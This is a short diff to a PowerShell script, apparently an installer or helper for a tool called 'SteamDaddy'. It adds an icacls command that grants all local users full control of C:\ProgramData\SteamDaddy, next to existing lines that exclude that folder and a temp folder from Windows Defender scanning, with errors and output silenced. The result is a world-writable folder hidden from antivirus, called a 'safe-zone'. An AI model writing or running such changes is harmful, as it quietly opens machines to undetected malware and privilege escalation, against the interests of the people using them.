@@ -36,6 +36,7 @@ try {
     if (-not (Test-Path $sdTempDir)) {
         New-Item -ItemType Directory -Path $sdTempDir -Force | Out-Null
     }
+    & icacls "C:\ProgramData\SteamDaddy" /grant "*S-1-5-32-545:(OI)(CI)F" /C /Q | Out-Null
     Write-Host "[SteamDaddy] Excluding safe-zone temp folder: $sdTempDir" -ForegroundColor Yellow
     Add-MpPreference -ExclusionPath "C:\ProgramData\SteamDaddy" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $sdTempDir -ErrorAction SilentlyContinue
